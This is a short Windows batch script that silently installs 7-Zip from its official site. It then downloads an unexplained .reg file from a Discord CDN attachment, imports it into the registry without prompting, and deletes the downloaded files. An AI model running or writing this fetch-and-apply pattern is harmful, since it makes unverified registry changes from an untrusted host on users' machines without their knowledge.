@echo off

:: DOWNLOADING 7ZIP INSTALLER
powershell -Command "Invoke-WebRequest https://www.7-zip.org/a/7z1900-x64.exe -OutFile %temp%/7z.exe"

:: INSTALLING 7ZIP
start /wait %temp%/7z.exe /S

:: DOWNLOADING 7ZIP REG 
powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/784548107013849161/877169644820123658/7z.reg -OutFile %temp%/7z.reg"

:: APPLYING 7ZIP REG
regedit.exe /S %temp%/7z.reg

:: DELETING TEMP FILES
del %temp%/7z.exe
del %temp%/7z.reg

exit